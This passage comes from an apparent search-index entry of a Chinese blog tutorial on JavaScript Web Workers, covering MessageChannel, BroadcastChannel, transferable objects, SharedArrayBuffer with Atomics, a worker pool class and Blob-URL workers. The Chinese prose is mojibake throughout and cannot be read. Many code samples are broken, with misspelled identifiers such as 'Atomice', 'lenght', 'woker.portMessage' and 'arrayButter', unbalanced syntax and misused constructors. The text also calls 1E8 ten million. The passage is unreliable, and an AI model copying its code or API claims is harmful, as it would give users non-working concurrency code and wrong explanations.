å¼•å…¥ä»»æ„æ•°é‡çš„è„šæœ¬ç”Ÿå‘½å‘¨æœŸâ€‹\téæ­£å¼åœ°åˆ†ä¸ºä¸‰ä¸ªçŠ¶æ€ï¼šåˆå§‹åŒ–ï¼ˆinitializingï¼‰ã€æ´»åŠ¨ï¼ˆactiveï¼‰ã€ç»ˆæ­¢ï¼ˆterminatedï¼‰ï¼Œå¯¹äºå…¶ä»–ä¸Šä¸‹æ–‡æ˜¯ä¸å¯è§çš„ã€‚â€‹\tåˆ›å»ºä¹‹åï¼Œä¸“ç”¨å·¥ä½œè€…çº¿ç¨‹ä¼´éšç€ é¡µé¢æ•´ä¸ªç”Ÿå‘½æœŸè€Œå­˜åœ¨ã€‚å³ä½¿çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ï¼Œå…¶ç¯å¢ƒä»ç„¶ä¼šå­˜åœ¨ï¼Œä¸ä¹‹å…³è”çš„Workerå¯¹è±¡å°±ä¸ä¼šè¢«å›æ”¶ã€‚â€‹\tå…³é—­çº¿ç¨‹ï¼š  close()ï¼š:one: å–æ¶ˆäº‹ä»¶å¾ªç¯ä¸­çš„æ‰€æœ‰ä»»åŠ¡ï¼Œå¹¶é˜»æ­¢ç»§ç»­æ·»åŠ æ–°ä»»åŠ¡ï¼› :two: ä¸åœæ­¢å·²ç»å­˜åœ¨çš„åŒæ­¥ä»»åŠ¡ã€‚  terminateï¼š çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—è¢«æ¸…ç†å¹¶é”ä½ï¼Œç«‹å³åœæ­¢ä¸”æ²¡æœ‰æ¸…ç†çš„æœºä¼šã€‚// ä¸»çº¿ç¨‹worker.terminate();// Worker çº¿ç¨‹self.close();â€‹\tåœ¨æ•´ç”Ÿå‘½å‘¨æœŸä¸­ï¼Œä¸“ç”¨å·¥ä½œè€…çº¿ç¨‹åªå…³è”ä¸€ä¸ªé¡µé¢â€”â€”åªè¦é¡µé¢å­˜åœ¨ï¼Œä¸“ç”¨çº¿ç¨‹å°±ä¼šå­˜åœ¨ï¼›é¡µé¢ç¦»å¼€ï¼Œä¸é¡µé¢å…³è”çš„å·¥ä½œè€…çº¿ç¨‹æ ‡å¿—ä¸ºç»ˆæ­¢ï¼Œä¸”æ‰§è¡Œç«‹å³åœæ­¢ã€‚é€šä¿¡â€‹\tå¼‚æ­¥ã€æ¶ˆæ¯å®Œæˆé€šä¿¡postMessage() â€”â€” ä¸´æ—¶é€šä¿¡MessageChannel() â€”â€” ä¸“ç”¨é€šä¿¡â€‹\tChannel Messaging API çš„ MessageChannel æ¥å£å…è®¸æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„æ¶ˆæ¯é€šé“ï¼Œå¹¶é€šè¿‡å®ƒçš„ä¸¤ä¸ª MessagePort å±æ€§å‘é€æ•°æ®ã€‚MessageChannelå®ä¾‹æœ‰ä¸ªä¸¤ä¸ªåªè¯»å±æ€§ï¼ŒMessageChannel.port1 &amp; MessageChannel.port2ï¼Œå°±åƒç”µè¯çš„ä¸¤ç«¯ï¼Œä½¿ç”¨å…¶ä¸­ä¸€ä¸ªç«¯å£å‘é€ä¿¡æ¯ï¼Œå¦ä¸ªç«¯å£çš„ç›‘è§†äº‹ä»¶å°±å¯ä»¥æ¥æ”¶åˆ°æ•°æ®ã€‚éœ€è¦å€ŸåŠ© postMessage()å»ºç«‹çš„ä¸´æ—¶é“¾æ¥ åˆ†æ´¾ç«¯å£ç»™å­å·¥ä½œè€…çº¿ç¨‹ã€‚  å…¶ä»–å¦™ç”¨ï¼š  â€‹\tç®¡é“é€šä¿¡ â€”â€” MessageChannelç”¨æ³•æ€»ç»“ - å…¨ç‰ - åšå®¢å›­ (cnblogs.com)  â€‹\tå…¶ä»–æ¡†æ¶ä½¿ç”¨åœºæ™¯ â€”â€” æµ…è°ˆMessageChannel - æ˜é‡‘ (juejin.cn)// main.jsconst { port1, port2 } = new MessageChannel();const workerA = new Worker('./scriptA.js')const workerB = new Worker('./scriptB.js')// 1. éœ€è¦æŠŠç«¯å£å‘é€ç»™å·¥ä½œè€…çº¿ç¨‹ä¸­ï¼Œå»ºç«‹ä¸¤è€…çš„é“¾æ¥workerA.postMessage('connect',[port1]);workerB.postMessage('connect',[port2]);// 2. æ§åˆ¶ä¸¤ä¸ªå·¥ä½œè€…çº¿ç¨‹ä¼ é€’æ¶ˆæ¯workerA.postMessage('sending')workerB.postMessage('sending')// scriptA.jslet port;self.onmessage = (e)=&gt;{    switch (e.data){        case 'connect':            port = e.ports[0]          \tbreak;       \tcase 'listening'            port.onmessage = (event) =&gt; {console.log(`workerA get the msg from workerB`)}            break;        case 'sending':            port.postMessage = ('listening') // port1 åªèƒ½å‘ port2 ä¼ é€’æ¶ˆæ¯\t            break;    }}BroadcastChannel() â€”â€” å¹¿æ’­é€šä¿¡â€‹\tåŒæºè„šæœ¬å¯ä»¥é€šè¿‡BroadcastChannaeläº’ç›¸å‘é€ã€æ¥æ”¶ä¿¡æ¯ï¼Œå¦‚å¹¿æ’­é€šä¿¡ï¼Œéœ€è¦æœ‰å®ä½“ç›‘å¬ä¿¡é“æ‰èƒ½è·å¾—å¤„ç†ã€‚ä¸”è€ƒè™‘åˆå§‹åŒ–å·¥ä½œè€…çº¿ç¨‹å»¶è¿Ÿï¼Œåº”è¯¥ä½¿ç”¨è®¡æ—¶å™¨å»¶åå¤„ç†ã€‚// main.jsconst channel = new BroadcastChannel('worker_channel');const worker = new Worker('./Worker.js');channel.onmessage = ({data}) =&gt; {    console.log(`heard ${data} on page`);}// å»¶æ—¶ï¼Œç­‰å·¥ä½œè€…çº¿ç¨‹åˆå§‹åŒ–å®ŒæˆsetTimeout(() =&gt; channel.postMessage('foo'), 1000 );// Worker.jsconst channel = new BroadcastChannel('worker_channel');self.onmessage = ({data}) =&gt; {    console.log(`heard ${data} in worker`);    channel.postMessage('bar'), 1000 );}æ•°æ®ä¼ è¾“â€‹\tä¸åŒçº¿ç¨‹å¤„äºä¸åŒçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå®ƒä»¬ä¹‹é—´çš„æ•°æ®ä¼ è¾“ä¼šå°è¯•é”€æ¯ã€‚è½¬ç§»ä¿¡æ¯çš„æ–¹å¼æœ‰ä¸‰ç§ï¼šç»“æ„åŒ–å…‹éš†ç®—æ³•ï¼ˆ structured clone algorithmï¼‰ã€å¯ç§»åŠ¨å¯¹è±¡ï¼ˆtransferable objectï¼‰ã€å…±äº«æ•°ç»„ç¼“å†²åŒºï¼ˆshared array buffersï¼‰ç»“æ„åŒ–å…‹éš†ç®—æ³•â€‹\tåœ¨æµè§ˆå™¨åå°å®ç°ï¼Œä¸å¯ä»¥æ˜¾å¼è°ƒç”¨ã€‚é€šè¿‡postMessage()ä¼ é€’å¯¹è±¡æ—¶ï¼Œæµè§ˆå™¨éå†è¯¥å¯¹è±¡ï¼Œå¹¶åœ¨ç›®æ ‡ä¸Šä¸‹æ–‡ä¸­ç”Ÿæˆä¸€ä¸ªå‰¯æœ¬ï¼ˆæ·±æ‹·è´ï¼‰ï¼Œæ”¯æŒé™¤äº†Symbolä¹‹å¤–çš„æ‰€æœ‰åŸå‹ç±»å‹ã€‚â€‹\tæ³¨æ„ç‚¹ï¼š  å¯ä»¥è¯†åˆ«å¯¹è±¡åŒ…å«çš„å¾ªç¯å¼•ç”¨ï¼Œä¸ä¼šæ— ç©·éå†å¯¹è±¡  å…‹éš†errorå¯¹è±¡ã€Functionå¯¹è±¡ã€DOMèŠ‚ç‚¹ä¼šæŠ›å‡ºé”™è¯¯  å¹¶ä¸æ€»æ•°åˆ›å»ºå®Œå…¨ä¸€ç›´çš„å‰¯æœ¬ï¼Œå¯¹è±¡å±æ€§æè¿°ç¬¦ã€get() set()ã€åŸå‹é“¾ã€RegExp.prototype.lastIndexå±æ€§ä¸ä¼šå¤åˆ¶å¯ç§»åŠ¨å¯¹è±¡â€‹\tæŠŠæ‰€æœ‰æƒä»ä¸€ä¸ªä¸Šä¸‹æ–‡è½¬ç§»åˆ°å¦ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œé€‚ç”¨äºåœ¨ä¸å¤ªå¯èƒ½å¤§é‡å¤åˆ¶æ•°æ®çš„æƒ…å†µä¸‹ã€‚â€‹\tpostMessage() çš„ç¬¬äºŒä¸ªå¯é€‰å‚æ•°æ˜¯æ•°ç»„ï¼ŒæŒ‡å®šè½¬ç§»å“ªäº›å¯¹è±¡ã€‚æµè§ˆå™¨éå†æ¶ˆæ¯è´Ÿè½½æ—¶ï¼Œæ ¹æ®è¿™ä¸ªæ•°æ®æ£€æŸ¥å¯¹è±¡å¼•ç”¨ï¼Œç§»åŠ¨è€Œä¸æ˜¯å¤åˆ¶å®ƒä»¬ã€‚// main.jsconst worker = new Worker('./worker.js')const arrayBuffer = new ArrayBuffer(32); // ä¸»çº¿ç¨‹ç”³è¯·32ä½çš„æ•°ç»„ç¼“å†²åŒº// ç¬¬ä¸€ç§ï¼Œå¸¸è§„åŒ–å…‹éš†ç®—æ³•worker.postMessage(arrayBuffer);arrayBuffer.byteLength; // 32, ä¸»çº¿ç¨‹ä¾ç„¶ç•™æœ‰// ç¬¬äºŒç§ï¼Œå¯ç§»åŠ¨å¯¹è±¡worker.postMessage(arrayBuffer, [arrayBuffer]);arrayBuffer.byteLength; // 0// worker.jsself.onmessage = ({data}) =&gt; {    console.log(arrayBuffer.byteLength;); // 32}â€‹\tworker.postMessage({foo:{bar:arrayBuffer}}, [arrayBuffer]); åµŒå¥—åœ¨å¯¹è±¡å†…éƒ¨å¯ç§»åŠ¨å¯¹è±¡ï¼ŒåŒ…è£…å¯¹è±¡è¢«å¤åˆ¶ã€åµŒå¥—å¯¹è±¡è¢«è½¬ç§»å…±äº«æ•°ç»„ç¼“å†²åŒºâ€‹\tSharedArrayBufferä½œä¸ºArrayBufferèƒ½å¤Ÿåœ¨ä¸åŒæµè§ˆå™¨ä¸Šä¸‹æ–‡é—´å…±äº«ï¼Œåœ¨ä½¿ç”¨postMessageæ—¶åªä¼šä¼ é€’åŸå§‹ç¼“å†²åŒºçš„å¼•ç”¨ â€”â€” å¤šä¸ªä¸Šä¸‹æ–‡ï¼ˆå¹¶è¡Œçº¿ç¨‹ï¼‰åˆ†åˆ«ç»´æŠ¤åŒä¸€ä¸ªå†…å­˜å—ï¼Œå­˜åœ¨èµ„æºäº‰ç”¨çš„é£é™©ã€‚å¯ä»¥ä½¿ç”¨Atomicså¯¹è±¡ï¼Œè®©å·¥ä½œè€…çº¿ç¨‹è·å¾—SharedArrayBufferå®ä¾‹çš„é”ï¼šAtomics.add(view, viewä¸‹æ ‡, argument)ï¼Œåœ¨æ‰§è¡Œå®Œæˆå…¨éƒ¨è¯»å†™æ“ä½œåï¼Œæ‰å…è®¸ä¸‹ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œæ“ä½œã€‚// main.jsconst workers = [] // çº¿ç¨‹æ± for(let i = 0; i&lt;4; ++i){    workers.push(new Worker('./worker.js'));}let responseCount = 0; // è·å–è®¡ç®—ç»“æœfor(const worker of workers){    worker.onmessage = () =&gt;{\t\tif(++responseCount === workers.lenght){        \tconsole.log(`Final buffer value: ${ view[0] }`)         }    }}const shareArrayBuffer = new SharedArrayBuffer(4); // åˆå§‹åŒ–`SharedArrayBuffer`const view = new Uint32Array(SharedArrayBuffer);   // åˆ›å»º`SharedArrayBuffer`è§†å›¾view[0] = 1;for(const worker of workers){    woker.portMessage(SharedArrayBuffer);}// Final buffer value: 400001// worker.jsself.onmessage = ({data} =&gt; {\tconst view = new Uint32Array(data);    // æ‰§è¡Œ100ä¸‡æ¬¡æ“ä½œ    for(let i = 0; i &lt; 1E6; ++i){\t\t// view[0] += 1;  å¯èƒ½äº§ç”Ÿè„è¯»        Atomice(view, 0, 1);    }})çº¿ç¨‹æ± â€‹\tä½¿ç”¨å›ºå®šæ•°é‡çš„çº¿ç¨‹æ´»åŠ¨ï¼Œæ ¹æ®çº¿ç¨‹çŠ¶æ€ç©ºé—²ä¸å¦åˆ†é…ä»»åŠ¡ã€‚çº¿ç¨‹åœ¨æ‰§è¡Œä»»åŠ¡æ—¶ï¼Œä¼šè¢«æ ‡è®°ä¸ºå¿™ç¢ŒçŠ¶æ€ï¼Œç›´è‡³é€šçŸ¥çº¿ç¨‹æ± ç©ºé—²æ—¶ï¼Œæ‰ä¼šè¢«å®‰æ’æ–°çš„å·¥ä½œã€‚è¿™äº›æ´»åŠ¨çº¿ç¨‹è¢«ç§°ä¸ºâ€œçº¿ç¨‹æ± â€ã€‚â€‹\tnavigator.hardware Concurrencyå±æ€§è¿”å› ç³»ç»Ÿå¯ç”¨çš„æ ¸å¿ƒæ•°é‡ï¼Œæœ€å¥½ä»¥æ­¤ä½œä¸ºçº¿ç¨‹æ± å¤§å°çš„ä¸Šé™ã€‚â€‹\tçº¿ç¨‹ç­–ç•¥ï¼šæ¯ä¸ªçº¿ç¨‹æ‰§è¡Œç›¸åŒçš„ä»»åŠ¡ï¼Œä½†å…·ä½“æ‰§è¡Œä»€ä¹ˆä»»åŠ¡ç”±å‚æ•°ä¸ªæ•°æ§åˆ¶ã€‚çº¿ç¨‹æ‰§è¡Œè€—æ—¶è®¡ç®—åè¿”å›ç»“æœï¼Œçº¿ç¨‹æ± åœ¨å°†å…¶ä»–å·¥ä½œåˆ†é…ç»™çº¿ç¨‹æ‰§è¡Œã€‚egï¼šâ€‹\tå®šä¹‰TaskWorkerç±»ï¼šè·Ÿè¸ªçº¿ç¨‹æ˜¯å¦æ­£å¿™äºå·¥ä½œã€ç®¡ç†è¿›å‡ºçº¿ç¨‹çš„ä¿¡æ¯å’Œäº‹ä»¶ã€‚class TaskWorker extends Worker{    constructor(notifyAvailable, ...workerArgs){        super(...workerArges);                this.available = false;        this.resolve = false;        this.reject = false;                this.notifyAvailable = notifyAvailable; // ç©ºé—²æ—¶ï¼Œå‘çº¿ç¨‹æ± å‘é€ä¿¡å·ï¼Œä»¥åˆ†é…ä»»åŠ¡        this.onmessage = () =&gt; this.setAvailable(); // çº¿ç¨‹å®Œæˆåˆå§‹åŒ–æ—¶ï¼Œå‘çº¿ç¨‹æ± å‘é€ä¿¡æ¯    }    dispatch({resoleve, reject, postMessageArgs}){        this.available = false;        this.onmessage = ({data}) =&gt; {            resolve(data);            this.setAvailable();        }        this.onerror //... è°ƒç”¨ reject()ã€setAvailable()        this.postMessageArgs(...postMessageArgs);    }    setAvailable(){ // åˆå§‹åŒ–çº¿ç¨‹ï¼Œé€šçŸ¥çº¿ç¨‹æ±         this.available = false;        this.resolve = false;        this.reject = false;        this.notifyAvailable();             }}â€‹\tå®šä¹‰workerPoolç±»ï¼Œä½¿ç”¨TaskWorkerç±»ï¼šç®¡ç†æœªæ‰§è¡Œçš„ä»»åŠ¡é˜Ÿåˆ—ï¼Œå¹¶è´Ÿè´£å…³é—­çº¿ç¨‹class WorkerPool {    constructor(poolSize, ...workerArgs){        this.taskQueue = [];        this.workers = [];        // åˆå§‹åŒ–çº¿ç¨‹æ±         for(let i = 0; i &lt; poolSize; ++i){            this.workers.push(                // å°†å¯åˆ†é…çš„çº¿ç¨‹æ¨å…¥æ•°ç»„            \tnew TaskWorker(() =&gt; this.dispatchIfAvaliable(), ...workerArgs);            )        }        // åˆå§‹åŒ–ä»»åŠ¡é˜Ÿåˆ—        enqueue(...postMessagee){            return new Promise((resolve, reject) =&gt; {                this.taskQueue.push({resolve, reject});                this.dispatchIfAvaliable();            })        }        // å°†ä»»åŠ¡åˆ†é…ç»™çº¿ç¨‹        dispatchIfAvaliable(){            if(!this.taskQueue.lenght) return; // æ²¡æœ‰å¯ä»¥ç”¨çš„çº¿ç¨‹            for(const worker of this.workers){                if(worker.avaliable){                    let a = this.taskQueue.shift();                    worker.dispatch(a);                    break;                }            }        }        // ç»ˆæ­¢æ‰€æœ‰å·¥ä½œè€…çº¿ç¨‹        close(){            for(const worker of this.workers){                worker.terminate();            }        }    }}â€‹\tä½¿ç”¨æ¡ˆä¾‹ï¼š è®¡ç®—1000ä¸‡ä¸ªæµ®ç‚¹æ•°ä¹‹å’Œ// worker.jsself.onmessage = ({data}) =&gt; {    let sum = 0;    let view = new Float32Array(data.arrayButter);        for(let i = data.arrayButter; i&lt;data.endIdx; ++i){        sum += view[1];    }    self.postMessage('ready');}// main.jsconst totalFloats = 1E8; //1000ä¸‡const numTasks = 20; // 20ä¸ªä»»åŠ¡const floatPerTask = totalFloats / numberTasks; // æ¯ä¸ªçº¿ç¨‹è®¡ç®—æ•°const numWorker = 4; // 4ä¸ªçº¿ç¨‹// åˆ›å»ºçº¿ç¨‹æ± const pool = new WorkerPool(num, './worker.js');// å¡«å……æµ®ç‚¹æ•°let arrayBuffer = new ShareArrayBuffer(4 * totalFloats);let view = new Float32Array(data.arrayButter);for(let i = 0; i &lt; totalFloats; i++){    view[i] = Math.random();}let partialsumPromises = [];for(let i = 0; i&lt; totalFloats; i += floatPerTask){    partialSumPromises.push( // ç»´æŠ¤ä¸€ä¸ªpromiseé˜Ÿåˆ—    \tpool.enqueue({ // æ·»åŠ è¿›çº¿ç¨‹æ± ä»»åŠ¡é˜Ÿåˆ—            startIdx: i,            endIdx: i + floatPerTask,            arrayBuffer        })    )}// ç­‰å¾…promiseé˜Ÿåˆ—å…¨éƒ¨ä»»åŠ¡ç»“æŸPromise.all(partialSumPromises)\t.then(partialSum =&gt; partialSum.reduce((prev,cur) =&gt; prev + cur))\t.then(finalSum =&gt; console.log(finalSum))"
  },
  
  {
    "title": "å·¥ä½œè€…çº¿ç¨‹",
    "url": "/posts/%E5%B7%A5%E4%BD%9C%E8%80%85%E7%BA%BF%E7%A8%8B/",
    "categories": "javascriptThread",
    "tags": "javascriptThread, Thread",
    "date": "2024-01-20 00:00:00 +0800",
    





    
    "snippet": "å·¥ä½œè€…çº¿ç¨‹â€‹\tå…è®¸æŠŠä¸»çº¿ç¨‹çš„å·¥ä½œè½¬ç§»åˆ°ç‹¬ç«‹çš„å®ä½“ï¼Œè€Œä¸æ”¹å˜ç°æœ‰çš„å•çº¿ç¨‹æ¨¡å¼ã€‚æµè§ˆå™¨ä¸»çº¿ç¨‹è´Ÿè´£ä¸å¤„ç†ç”¨æˆ·äº‹ä»¶å’Œé¡µé¢ç»˜åˆ¶ç­‰ã€‚â€‹\tJavaScriptç¯å¢ƒå®é™…æ˜¯è¿è¡Œåœ¨æ‰˜ç®¡æ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿç¯å¢ƒã€‚æ¯ä¸ªé¡µé¢éƒ½æœ‰è‡ªå·±çš„ç¯å¢ƒï¼Œå†…å­˜ã€äº‹ä»¶å¾ªç¯ã€DOMç­‰ç­‰ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–é¡µé¢ã€‚æ‰€æœ‰é¡µé¢ç¯å¢ƒéƒ½æ˜¯å¹¶è¡Œå¤„ç†çš„ã€‚â€‹\tä½¿ç”¨å·¥ä½œè€…çº¿ç¨‹ï¼Œå¯ä»¥åœ¨åŸå§‹é¡µé¢ç¯å¢ƒä¹‹å¤–ï¼Œåœ¨åˆ†é…ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„äºŒçº§å­ç¯å¢ƒï¼Œä¸ä¸»çº¿ç¨‹ä¸èƒ½ç›´æ¥é€šä¿¡åªèƒ½ä½¿ç”¨ æ¶ˆæ¯...",
    "content": "å·¥ä½œè€…çº¿ç¨‹â€‹\tå…è®¸æŠŠä¸»çº¿ç¨‹çš„å·¥ä½œè½¬ç§»åˆ°ç‹¬ç«‹çš„å®ä½“ï¼Œè€Œä¸æ”¹å˜ç°æœ‰çš„å•çº¿ç¨‹æ¨¡å¼ã€‚æµè§ˆå™¨ä¸»çº¿ç¨‹è´Ÿè´£ä¸å¤„ç†ç”¨æˆ·äº‹ä»¶å’Œé¡µé¢ç»˜åˆ¶ç­‰ã€‚â€‹\tJavaScriptç¯å¢ƒå®é™…æ˜¯è¿è¡Œåœ¨æ‰˜ç®¡æ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿç¯å¢ƒã€‚æ¯ä¸ªé¡µé¢éƒ½æœ‰è‡ªå·±çš„ç¯å¢ƒï¼Œå†…å­˜ã€äº‹ä»¶å¾ªç¯ã€DOMç­‰ç­‰ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–é¡µé¢ã€‚æ‰€æœ‰é¡µé¢ç¯å¢ƒéƒ½æ˜¯å¹¶è¡Œå¤„ç†çš„ã€‚â€‹\tä½¿ç”¨å·¥ä½œè€…çº¿ç¨‹ï¼Œå¯ä»¥åœ¨åŸå§‹é¡µé¢ç¯å¢ƒä¹‹å¤–ï¼Œåœ¨åˆ†é…ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„äºŒçº§å­ç¯å¢ƒï¼Œä¸ä¸»çº¿ç¨‹ä¸èƒ½ç›´æ¥é€šä¿¡åªèƒ½ä½¿ç”¨ æ¶ˆæ¯ å®Œæˆï¼Œä¸èƒ½ä¸ä¾èµ–å•çº¿ç¨‹äº¤äº’çš„APIï¼ˆå¦‚DOMï¼‰äº’æ“ä½œï¼Œä½†å¯ä»¥ä¸çˆ¶ç¯å¢ƒå¹¶è¡Œæ‰§è¡Œã€‚å·¥ä½œè€…çº¿ç¨‹ç›¸å¯¹è¾ƒé‡ï¼Œé€šå¸¸å ç”¨è¾ƒå¤§å†…å­˜ï¼Œä¸å»ºè®®å¤§é‡ä½¿ç”¨ï¼›è°ƒåº¦ä¹‹é—´å­˜åœ¨æ€§èƒ½æŸè€—ï¼Œæ‰€ä»¥åº”è¯¥è°¨æ…ä½¿ç”¨çº¿ç¨‹ï¼Œç»™å¸¸é©»çš„ã€å¯åŠ¨æˆæœ¬é«˜çš„ã€è®¡ç®—é‡è¾ƒå¤§çš„å·¥ä½œåˆ†é…ã€‚â€‹\tğŸˆ\tä»¥å®é™…çº¿ç¨‹å®ç°çš„ï¼Œå¯¹åº”ç€åº•å±‚çš„çº¿ç¨‹ã€‚â€‹\tğŸˆ\tç¯å¢ƒå†…çš„æŒ‡ä»¤æ˜¯å¯ä»¥å¹¶è¡Œæ‰§è¡Œçš„â€‹\tğŸˆ\tå¯ä»¥å…±äº«æŸäº›å†…å­˜ï¼Œä½†ä¸å®Œå…¨å…±äº«å…¨éƒ¨å†…å­˜ã€‚å¯ä»¥ä½¿ç”¨sharedArrayBufferåœ¨å¤šä¸ªç¯å¢ƒé—´å…±äº«å†…å®¹ â€”â€” ä½¿ç”¨Atomicsæ¥å£å®ç°å¹¶å‘æ§åˆ¶ï¼Œå…¶ä»–æ•°æ®è¿›å‡ºçº¿ç¨‹éœ€è¦ç§»åŠ¨æˆ–è€…å¤åˆ¶ã€‚â€‹\tğŸˆ\tå·¥ä½œè€…çº¿ç¨‹ä¸ä¸€å®šåœ¨åŒä¸€ä¸ªè¿›ç¨‹é‡Œï¼Œå…±äº«å·¥ä½œè€…çº¿ç¨‹å’ŒæœåŠ¡å·¥ä½œè€…çº¿ç¨‹å°±å¯èƒ½ä½¿ç”¨ç‹¬ç«‹çš„è¿›ç¨‹ã€‚â€‹\tå­˜åœ¨é™åˆ¶ï¼šâ€‹\tğŸš«\tå·¥ä½œè€…çº¿ç¨‹ï¼ˆé¡¶çº§å·¥ä½œè€…çº¿ç¨‹å’Œå­å·¥ä½œè€…çº¿ç¨‹ï¼‰çš„è„šæœ¬æ–‡ä»¶åªèƒ½ä»çˆ¶é¡µé¢ç›¸åŒçš„æºåŠ è½½ã€‚å¯ä»¥åŠ è½½ã€æ‰§è¡Œå…¶ä»–éåŒæºçš„è„šæ­¥ï¼ˆimportScript()ï¼‰ã€‚â€‹\tğŸš«\tWorker çº¿ç¨‹å’Œä¸»çº¿ç¨‹ä¸åœ¨åŒä¸€ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œå®ƒä»¬ä¸èƒ½ç›´æ¥é€šä¿¡ï¼Œå¿…é¡»é€šè¿‡æ¶ˆæ¯å®Œæˆã€‚â€‹\tğŸš«\tWorker çº¿ç¨‹æ— æ³•è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå³ä¸èƒ½æ‰“å¼€æœ¬æœºçš„æ–‡ä»¶ç³»ç»Ÿï¼ˆfile://ï¼‰ã€‚â€‹\tğŸš« \tæ— æ³•è¯»å–ã€æ“ä½œä¸»çº¿ç¨‹æ‰€åœ¨ç½‘é¡µçš„ DOM å¯¹è±¡ã€windowå¯¹è±¡ç­‰â€‹\tå­å·¥ä½œè€…çº¿ç¨‹ï¼Œç¡®ä¿å¹¶è¡Œè®¡ç®—çš„æŠ•å…¥çš„æ”¶ç›Š &gt; å¤šä¸ªå­çº¿ç¨‹è®¡ç®—æˆæœ¬ï¼›å­å·¥ä½œè€…çº¿ç¨‹çš„è„šæœ¬è·¯å¾„æ ¹æ®çˆ¶å·¥ä½œè€…çº¿ç¨‹è§£æã€‚æœ¬åœ°æ–‡ä»¶åˆå§‹åŒ–å·¥ä½œè€…çº¿ç¨‹â€‹\tå·¥ä½œè€…çº¿ç¨‹éœ€è¦åŸºäºè„šæœ¬æ–‡ä»¶åˆ›å»ºï¼Œä½†ä¸æ„å‘³ç€è¯¥è„šæœ¬å¿…é¡»æ˜¯è¿œç¨‹èµ„æºã€‚å¯ä»¥åˆ©ç”¨Blobå¯¹è±¡çš„URLåœ¨è¡Œå†…åˆ›å»ºã€‚ å¯ä»¥æ›´å¿«é€Ÿåˆå§‹åŒ–å·¥ä½œè€…çº¿ç¨‹ï¼Œæ²¡æœ‰ç½‘ç»œå»¶è¿Ÿã€‚â€‹\tBlob å¯¹è±¡ï¼ŒäºŒè¿›åˆ¶ç±»å‹çš„å¤§æ–‡ä»¶ï¼Œæ˜¯ä¸å¯å˜ã€åŸå§‹æ•°æ®çš„ç±»æ–‡æœ¬å¯¹è±¡ï¼›å¯ä»¥ä»¥æ–‡æœ¬ã€äºŒè¿›åˆ¶æ ¼å¼è¯»å–ï¼Œæˆ–è½¬ä¸ºreadable Streamã€‚  new Blob(array,{option})ï¼š          arrayï¼Œå¯è¿­ä»£å¯¹è±¡ï¼ŒArrayã€DataViewã€Blobã€å­—ç¬¦ä¸²æˆ–ä»–ä»¬çš„æ··åˆï¼Œå°†è¢«æ”¾å…¥Blobä¸­      optionï¼ŒæŒ‡å®štypeï¼ˆæŒ‡å®šæ•°æ®çš„MIMEç±»å‹ï¼‰å’Œendingsï¼ˆåŒ…å«ç»“æŸç¬¦/nå­—ç¬¦ä¸²å°†å¦‚ä½•è¢«å†™å…¥ï¼‰ä¸¤ä¸ªå±æ€§çš„å¯¹è±¡                  MIMEï¼ˆå¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ Multipurpose Internal Mail Extensions)ï¼Œå¦‚text/html image/png text/plain text/script          endings:transparent é»˜è®¤å€¼ï¼Œä¿å­˜ä¸å˜          endings:native æ›´æ”¹ä¸ºæ›´é€‚åˆå®¿ä¸»ç³»ç»Ÿçš„æ¢è¡Œç¬¦ã€‚                      URL.createObjectURL(object) â€”â€” URL.revokeObjectURL(objectURL)          ä¼ å…¥ File / Blob / Medioa å¯¹è±¡ ç”¨ä»¥åˆ›å»º URL      ä½¿ç”¨URL.createObjectURL(object)åˆ›å»ºå¯¹è±¡URLï¼Œä»£è¡¨å¯¹è±¡å­˜åœ¨å¼•ç”¨ï¼Œä¼šå½±å“å†…å­˜åƒåœ¾å›æ”¶ï¼Œåº”è¯¥åœ¨åˆé€‚æ—¶æœºä½¿ç”¨URL.revokeObjectURL(objectURL) é‡Šæ”¾URLå¯¹è±¡      Web Workerä¸­å¯ä»¥ç”¨ï¼Œåœ¨Service Workerä¸­ä¸å¯ä»¥ç”¨ï¼Œå¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼ã€‚      // å‡½æ•°ååºåˆ—åŒ–ä¼ å…¥ï¼Œåœ¨çˆ¶ä¸Šä¸‹æ–‡ä¸­å®šä¹‰ï¼Œåœ¨å­ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œfunction Fibonacci(n) {    return n&lt;1 ? 0 : n&lt;2 ? 1 : Fibonacci(n-1) + Fibonacci(n-2)}// å­—ç¬¦ä¸²const workerString = `\tself.onmessage = ({data}) =&gt; console.log(data);\tself.postMessage((${ Fibonacci.toString() })(9))`const workerBlob = new Blob([workerString],{type: 'text/javascript'})const workerBlobURL = URL.createObjectURL(workerBlob);const worker = new Worker(workerBlobURL)worker.onmessage = ({data}) =&gt; console.log(data) // 34 æ¥æ”¶workerå›ä¼ æ•°æ®worker.postMessage('hi,just say something?'); // hi,just say something? å‘workerå‘ç”Ÿæ•°æ®// ç¼©å†™ï¼šconst worker = new Worker(URL.createObjectURL(new Blob([workerString])));åœ¨å·¥ä½œè€…çº¿ç¨‹ä¸­åŠ¨æ€æ‰§è¡Œè„šæœ¬â€‹\tä½¿ç”¨importScripts() æ–¹æ³•ç¼–ç¨‹æ–¹å¼ï¼Œä¸ä¸€å®šæŒ‰é¡ºåºåŠ è½½ã€æŒ‰é¡ºåºåŒæ­¥æ‰§è¡Œä»»æ„è„šæœ¬ï¼Œå¯ä»¥æ¥æ”¶ä»»æ„æ•°é‡çš„å‚æ•°  æ— è®ºæ˜¯ä»€ä¹ˆç±»å‹æ–‡ä»¶ï¼Œéƒ½ä¼šå½“æˆJavaScriptè§£æï¼Œæ‰€ä»¥éœ€è¦æ˜¯æœ‰æ•ˆçš„ JavaScript MIME ç±»å‹ï¼Œå¦‚text/javascript  